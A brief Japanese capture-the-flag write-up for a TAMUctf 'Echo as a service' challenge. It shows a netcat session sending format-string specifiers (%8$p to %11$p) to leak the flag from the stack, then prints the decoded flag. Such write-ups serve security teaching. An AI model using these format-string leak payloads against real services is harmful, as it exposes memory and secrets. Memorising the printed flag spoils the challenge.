# Solution
fsbがあり、flagがstack上に読み込まれているので、それを読みだしていけばよいだけ。

```
$ nc challenges.tamuctf.com 4251
Echo as a service (EaaS)
%8$p
0x61337b6d65676967
Echo as a service (EaaS)
%9$p
0x616d7230665f7973
Echo as a service (EaaS)
%10$p
0x7d316e6c75765f74
Echo as a service (EaaS)
%11$p

上記のバイト列を文字列に変換するとflagが分かる。
gigem{3asy_f0rmat_vuln1}
```
